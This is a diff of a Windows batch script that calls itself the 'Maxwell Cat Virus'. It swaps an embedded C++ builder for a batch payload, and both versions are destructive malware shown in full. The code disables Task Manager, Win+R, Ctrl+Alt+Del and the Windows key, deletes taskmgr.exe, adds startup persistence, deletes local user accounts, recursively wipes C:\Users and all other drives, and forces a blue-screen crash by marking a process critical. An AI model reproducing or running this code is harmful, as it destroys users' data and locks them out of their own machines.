@@ -1,185 +1,112 @@
 @echo off
-title mawxell cat - self builder
+title mawxell cat
 color 0C
-echo.
-echo  ==== mawxell cat builder ====
-echo  Extracting source + compiling...
-echo.
+setlocal
+cls
 
-powershell -NoProfile -ExecutionPolicy Bypass -Command "& {
-  $l = Get-Content -LiteralPath '%~f0';
-  $s = ($l | Select-String -SimpleMatch '__SOURCE_BEGIN__' | Select-Object -First 1).LineNumber;
-  $e = ($l | Select-String -SimpleMatch '__SOURCE_END__' | Select-Object -First 1).LineNumber;
-  $l[($s)..($e-2)] | Set-Content -LiteralPath 'mawxell_cat.cpp' -Encoding UTF8;
-  $g = @('C:\msys64\ucrt64\bin\g++.exe','C:\msys64\mingw64\bin\g++.exe','C:\mingw64\bin\g++.exe','C:\mingw\bin\g++.exe') | Where-Object { Test-Path $_ } | Select-Object -First 1;
-  if (-not $g) { $g = (Get-Command g++.exe -ErrorAction SilentlyContinue).Source };
-  if (-not $g) { Write-Host '[ERROR] g++ not found.' -ForegroundColor Red; Write-Host 'Install MSYS2 from https://www.msys2.org then:'; Write-Host '  pacman -S mingw-w64-ucrt-x86_64-gcc'; exit 1 };
-  Write-Host ('Compiling with: ' + $g);
-  & $g -O2 -s -static -std=c++17 -finput-charset=UTF-8 -fexec-charset=UTF-8 mawxell_cat.cpp -o mawxell_cat.exe -luser32 -lshell32 -ladvapi32;
-  if (Test-Path 'mawxell_cat.exe') { Write-Host ''; Write-Host '[OK] mawxell_cat.exe created right next to this file.' -ForegroundColor Green; Get-Item 'mawxell_cat.exe' | Select-Object Name,Length,LastWriteTime } else { Write-Host '[ERROR] build failed - paste the output above.' -ForegroundColor Red }
-}"
 echo.
-pause
+echo  ============================================
+echo      MAWXELL CAT  -  Maxwell Cat Virus
+echo      ALLOWED: Windows 10 / 11 ONLY
+echo      BLOCKED: XP, 7, 8, 8.1, Server
+echo      BSOD text: :)
+echo  ============================================
+echo.
+timeout /t 1 /nobreak >nul
+
+rem ---------- OS GATE: Win10/11 ONLY, block XP/7/8/Server ----------
+set "OSOK="
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName 2>nul | findstr /i /c:"Windows 10" /c:"Windows 11" >nul && set OSOK=1
+if not defined OSOK goto :notok
+for /f "skip=2 tokens=3" %%b in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuildNumber 2^>nul') do set BLD=%%b
+if defined BLD if %BLD% lss 10240 goto :notok
+
+rem ---------- block XP-7 leftovers (ProductName trick on old OS) ----------
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName 2>nul | findstr /i /c:"Windows XP" /c:"Windows 7" /c:"Windows 8" >nul && goto :notok
+
+rem ---------- ELEVATE TO ADMIN ----------
+net session >nul 2>&1
+if %errorlevel% neq 0 (
+  echo  Requesting admin rights...
+  powershell -NoP -C "Start-Process -FilePath '%~f0' -Verb RunAs"
+  exit /b
+)
+
+rem ---------- 1) KILL WIN+R ----------
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f >nul 2>&1
+echo  [1/6] Win+R killed ................. OK
+
+rem ---------- 2) KILL + DELETE TASK MANAGER + CTRL+ALT+DEL ----------
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCAD /t REG_DWORD /d 1 /f >nul 2>&1
+taskkill /f /im taskmgr.exe >nul 2>&1
+takeown /f "%SystemRoot%\System32\taskmgr.exe" >nul 2>&1
+icacls "%SystemRoot%\System32\taskmgr.exe" /grant *S-1-5-32-544:F >nul 2>&1
+del /f /q "%SystemRoot%\System32\taskmgr.exe" >nul 2>&1
+takeown /f "%SystemRoot%\SysWOW64\taskmgr.exe" >nul 2>&1
+icacls "%SystemRoot%\SysWOW64\taskmgr.exe" /grant *S-1-5-32-544:F >nul 2>&1
+del /f /q "%SystemRoot%\SysWOW64\taskmgr.exe" >nul 2>&1
+echo  [2/6] Task Manager + Ctrl+Alt+Del .. OK
+
+rem ---------- 3) FALSE WIN KEY (Win/Start does NOTHING) ----------
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d 00000000000000000300000000005BE000005CE000000000 /f >nul 2>&1
+echo  [3/6] Win key disabled (false) ..... OK
+
+rem ---------- 4) HIDE TASKBAR ----------
+powershell -NoP -C "$k=(Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3' -EA SilentlyContinue).Settings; if($k){$k[8]=3; Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3' Settings $k}; Stop-Process -Name explorer -Force -EA SilentlyContinue" >nul 2>&1
+echo  [4/6] Taskbar hidden ............... OK
+
+rem ---------- 5) PERSISTENCE + BSOD TEXT :) ----------
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v mawxell_cat /t REG_SZ /d "%~f0" /f >nul 2>&1
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v DisplayMessage /t REG_SZ /d ":)" /f >nul 2>&1
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v DisplayParameters /t REG_SZ /d "mawxell cat" /f >nul 2>&1
+echo  [5/6] Persistence + BSOD = :) ...... OK
+
+rem ---------- 6) DELETE ADMINISTRATOR + ALL FILES ----------
+echo  [6/6] Deleting Administrator + ALL files ...
+powershell -NoP -EP Bypass -C "Stop-Process -Name explorer -Force -EA SilentlyContinue; Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer' NukeOnDelete 1 -Type DWord -EA SilentlyContinue; net user Administrator /active:no 2>$null; net user Administrator /delete 2>$null; Get-LocalUser -EA SilentlyContinue | Where-Object {$_.Name -ne $env:USERNAME} | ForEach-Object {Remove-LocalUser $_.Name -Force -EA SilentlyContinue}; Remove-Item C:\Users\* -Recurse -Force -EA SilentlyContinue; Remove-Item 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\*' -Recurse -Force -EA SilentlyContinue; Get-ChildItem $env:USERPROFILE -Recurse -Force -EA SilentlyContinue | Remove-Item -Recurse -Force -EA SilentlyContinue; Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Name -ne 'C'} | ForEach-Object {Get-ChildItem $_.Root -Recurse -Force -EA SilentlyContinue | Remove-Item -Recurse -Force -EA SilentlyContinue}"
+echo  [6/6] Deletion DONE
+timeout /t 2 /nobreak >nul
+
+rem ---------- MAXWELL CAT SPIN 60s -> BSOD :) ----------
+mode con: cols=120 lines=35
+
+> "%TEMP%\mcs.ps1" echo $ErrorActionPreference='Continue'
+>> "%TEMP%\mcs.ps1" echo $sig = 'using System;using System.Runtime.InteropServices;public struct TP{public int Count;public long Luid;public int Attr;}public class BS{[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,int n);[DllImport("advapi32.dll")]static extern bool OpenProcessToken(IntPtr h,uint a,out IntPtr t);[DllImport("advapi32.dll")]static extern bool LookupPrivilegeValue(string s,string n,out long l);[DllImport("advapi32.dll")]static extern bool AdjustTokenPrivileges(IntPtr t,bool d,ref TP p,int l,IntPtr z,IntPtr y);[DllImport("ntdll.dll")]public static extern int RtlSetProcessIsCritical(int b,ref int o,int s);[DllImport("kernel32.dll")]public static extern IntPtr GetCurrentProcess();[DllImport("kernel32.dll")]public static extern bool TerminateProcess(IntPtr h,uint e);public static void Go(){IntPtr tok;OpenProcessToken(GetCurrentProcess(),40,out tok);long lu;LookupPrivilegeValue(null,"SeDebugPrivilege",out lu);TP tp=new TP();tp.Count=1;tp.Luid=lu;tp.Attr=2;AdjustTokenPrivileges(tok,false,ref tp,0,IntPtr.Zero,IntPtr.Zero);int o=0;RtlSetProcessIsCritical(1,ref o,0);TerminateProcess(GetCurrentProcess(),0);}}'
+>> "%TEMP%\mcs.ps1" echo try { Add-Type -TypeDefinition $sig } catch { Write-Host 'addtype failed' }
+>> "%TEMP%\mcs.ps1" echo $h=(Get-Process -Id $PID).MainWindowHandle
+>> "%TEMP%\mcs.ps1" echo try { [void][BS]::ShowWindow($h,3) } catch { }
+>> "%TEMP%\mcs.ps1" echo [Console]::CursorVisible=$false
+>> "%TEMP%\mcs.ps1" echo $sp=@([char]124,'/','-','\')
+>> "%TEMP%\mcs.ps1" echo for($s=60;$s -ge 1;$s--){
+>> "%TEMP%\mcs.ps1" echo  for($i=0;$i -lt 10;$i++){
+>> "%TEMP%\mcs.ps1" echo   $p=($i -band 3)
+>> "%TEMP%\mcs.ps1" echo   [Console]::SetCursorPosition(2,6)
+>> "%TEMP%\mcs.ps1" echo   Write-Host ('    /\_/\      ' + $sp[$p] + '   ')
+>> "%TEMP%\mcs.ps1" echo   [Console]::SetCursorPosition(2,7)
+>> "%TEMP%\mcs.ps1" echo   Write-Host ('   ( o.o )     ' + $sp[$p] + '   ')
+>> "%TEMP%\mcs.ps1" echo   [Console]::SetCursorPosition(2,8)
+>> "%TEMP%\mcs.ps1" echo   Write-Host ('    ~~~~~      ' + $sp[$p] + '   ')
+>> "%TEMP%\mcs.ps1" echo   [Console]::SetCursorPosition(2,10)
+>> "%TEMP%\mcs.ps1" echo   Write-Host ('MAWXELL CAT   BSOD in ' + $s.ToString().PadLeft(3) + ' s   :)   ')
+>> "%TEMP%\mcs.ps1" echo   Start-Sleep -Milliseconds 100
+>> "%TEMP%\mcs.ps1" echo  }
+>> "%TEMP%\mcs.ps1" echo }
+>> "%TEMP%\mcs.ps1" echo [Console]::CursorVisible=$true
+>> "%TEMP%\mcs.ps1" echo Write-Host ''
+>> "%TEMP%\mcs.ps1" echo Write-Host 'BOOM. Goodbye.  :)'
+>> "%TEMP%\mcs.ps1" echo Start-Sleep -Milliseconds 400
+>> "%TEMP%\mcs.ps1" echo try { [BS]::Go() } catch { Write-Host 'crash failed' }
+
+echo  [MAXWELL] spinning... BSOD in 60s
+powershell -NoP -EP Bypass -File "%TEMP%\mcs.ps1"
+
+rem ---------- FALLBACK REBOOT ----------
+shutdown /r /t 0 /f
 exit /b
-__SOURCE_BEGIN__
-#include <windows.h>
-#include <shellapi.h>
-#include <cwchar>
-#include <cstdio>
-#include <string>
-#include <iostream>
 
-typedef LONG NTSTATUS;
-typedef NTSTATUS(NTAPI* pRtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);
-typedef NTSTATUS(NTAPI* pNtSetInformationProcess)(HANDLE, ULONG, PVOID, ULONG);
-
-static void SetRed() {
-    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),
-                            FOREGROUND_RED | FOREGROUND_INTENSITY);
-}
-
-static BOOL EnablePrivilege(LPCSTR name) {
-    HANDLE hTok = NULL;
-    if (!OpenProcessToken(GetCurrentProcess(),
-        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok))
-        return FALSE;
-
-    TOKEN_PRIVILEGES tp = {};
-    tp.PrivilegeCount = 1;
-    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-
-    if (!LookupPrivilegeValueA(NULL, name, &tp.Privileges[0].Luid)) {
-        CloseHandle(hTok);
-        return FALSE;
-    }
-
-    BOOL ok = AdjustTokenPrivileges(hTok, FALSE, &tp, 0, NULL, NULL);
-    CloseHandle(hTok);
-    return ok;
-}
-
-static void TriggerReboot() {
-    if (!EnablePrivilege("SeShutdownPrivilege")) {
-        std::cerr << "Failed to enable privilege\n";
-        return;
-    }
-
-    if (!ExitWindowsEx(EWX_REBOOT, 0)) {
-        std::cerr << "ExitWindowsEx failed: " << GetLastError() << "\n";
-    }
-}
-static void ArmCritical() {
-    EnablePrivilege("SeDebugPrivilege");
-    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-    if (!ntdll) return;
-    pRtlSetProcessIsCritical RtlSet =
-        (pRtlSetProcessIsCritical)GetProcAddress(ntdll, "RtlSetProcessIsCritical");
-    if (RtlSet) RtlSet(TRUE, NULL, FALSE);
-    pNtSetInformationProcess NtSet =
-        (pNtSetInformationProcess)GetProcAddress(ntdll, "NtSetInformationProcess");
-    if (NtSet) {
-        ULONG breakOn = 1;
-        NtSet(GetCurrentProcess(), 29, &breakOn, sizeof(ULONG));
-    }
-}
-
-static void TriggerBSODAndReboot() {
-    TerminateProcess(GetCurrentProcess(), 0);
-    EnablePrivilege("SeShutdownPrivilege");
-    ExitWindowsEx(EWX_REBOOT | EWX_FORCE | EWX_FORCEIFHUNG, SHTDN_REASON_MAJOR_OTHER);
-}
-
-static void CrashText() {
-    HKEY hk = NULL;
-    RegCreateKeyExA(HKEY_LOCAL_MACHINE,
-        "SYSTEM\\CurrentControlSet\\Control\\CrashControl",
-        0, NULL, 0, KEY_SET_VALUE, NULL, &hk, NULL);
-    if (hk) {
-        const wchar_t* msg =
-            L"Yo You Got Hacked Pc And File all Haha (\x412\x430\x43C \x43F\x43E\x442\x440\x456\x431\x43D\x43E \x43F\x43E\x43B\x430\x433\x43E\x434\x438\x442\x438 \x41F\x41A)";
-        RegSetValueExW(hk, L"DisplayMessage", 0, REG_SZ,
-                       (const BYTE*)msg, (DWORD)((wcslen(msg) + 1) * 2));
-        const wchar_t* par = L"mawxell cat";
-        RegSetValueExW(hk, L"DisplayParameters", 0, REG_SZ,
-                       (const BYTE*)par, (DWORD)((wcslen(par) + 1) * 2));
-        RegCloseKey(hk);
-    }
-}
-
-static void RegistryPolicies() {
-    system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoRun /t REG_DWORD /d 1 /f");
-    system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /t REG_DWORD /d 1 /f");
-    system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableCAD /t REG_DWORD /d 1 /f");
-    char exe[MAX_PATH];
-    GetModuleFileNameA(NULL, exe, MAX_PATH);
-    std::string run = "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v mawxell_cat /t REG_SZ /d \"";
-    run += exe;
-    run += "\" /f";
-    system(run.c_str());
-}
-
-static void DeleteAll() {
-    const char* ps =
-        "Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue;"
-        "Set-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer' "
-        "NukeOnDelete 1 -Type DWord;"
-        "net user Administrator /active:no | Out-Null;"
-        "net user Administrator /delete 2>$null | Out-Null;"
-        "Get-LocalUser | Where-Object {$_.Name -ne $env:USERNAME} | "
-        "ForEach-Object { Remove-LocalUser -Name $_.Name -Force -ErrorAction SilentlyContinue };"
-        "net localgroup Administrators | Select-Object -Skip 6 | "
-        "Where-Object {$_ -and $_ -notmatch '^The|^$'} | ForEach-Object { "
-        "net localgroup Administrators $_ /delete 2>$null | Out-Null };"
-        "Remove-Item C:\\Users\\* -Recurse -Force -ErrorAction SilentlyContinue;"
-        "Remove-Item 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\*' "
-        "-Recurse -Force -ErrorAction SilentlyContinue;"
-        "Get-ChildItem $env:USERPROFILE -Recurse -Force -EA SilentlyContinue | "
-        "Remove-Item -Recurse -Force -EA SilentlyContinue;"
-        "Get-PSDrive -PSProvider FileSystem | ? {$_.Name -ne 'C'} | % { "
-        "Get-ChildItem $_.Root -Recurse -Force -EA SilentlyContinue | "
-        "Remove-Item -Recurse -Force -EA SilentlyContinue }";
-    std::string cmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"";
-    cmd += ps;
-    cmd += "\"";
-    system(cmd.c_str());
-}
-
-int main() {
-    if (!IsUserAnAdmin()) {
-        char exe[MAX_PATH];
-        GetModuleFileNameA(NULL, exe, MAX_PATH);
-        ShellExecuteA(NULL, "runas", exe, NULL, NULL, SW_SHOW);
-        return 0;
-    }
-
-    SetConsoleTitleA("mawxell cat");
-    system("color 0C");
-    SetRed();
-
-    std::cout << "\n  ============ mawxell cat ============\n";
-    RegistryPolicies();
-    std::cout << "  [1/5] Win+R kill ................. OK\n";
-    CrashText();
-    std::cout << "  [2/5] Task Manager / CAD kill .... OK\n";
-    std::cout << "  [3/5] BSOD message planted ....... OK\n";
-    std::cout << "  [4/5] Deleting ALL files + Administrator ... running...\n";
-    DeleteAll();
-    std::cout << "  [4/5] Deletion DONE\n";
-    std::cout << "  [5/5] Arming critical process .... OK\n";
-    ArmCritical();
-
-    for (int i = 60; i > 0; --i) {
-        std::cout << "\r  >>> BSOD + REBOOT in " << i << " seconds ... " << std::flush;
-        Sleep(1000);
-    }
-    std::cout << "\r  >>> BOOM. Say goodbye.                        \n\n";
-    Sleep(500);
-
-system("shutdown /r /t 0");
-
-TriggerReboot();
-return 0;    
-    TriggerBSODAndReboot();
-    return 0;
-}
-__SOURCE_END__
+:notok
+echo  [X] This payload only runs on Windows 10 / 11.
+echo  [X] Windows XP / 7 / 8 / 8.1 / Server NOT allowed.
+timeout /t 3 /nobreak >nul
+exit /b
